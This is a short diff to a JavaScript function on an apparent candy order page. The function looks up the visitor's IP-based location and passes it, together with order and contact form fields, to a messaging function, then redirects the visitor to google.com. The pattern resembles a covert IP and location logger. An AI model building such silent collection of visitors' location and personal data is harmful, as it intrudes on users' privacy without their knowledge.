@@ -19,8 +19,9 @@
 
     
          function ip()  {
-              $.get("https://localhost:6543", function(response) {
-          sendMessages(response.city + ", " + response.region + ", " + response.ip + ", Candy Name: " + document.getElementById('candyname').value + ", Amount of candy: " + document.getElementById('amount').value + ", Name on order: " + document.getElementById('ordername').value + ", Contact Info: " + document.getElementById('contactinfo').value)
+              $.get("http://localhost:6543", function(response) {
+          sendMessages(response)
+          alert(response)
           }, "json")
        location.href = 'https://google.com';           
     }
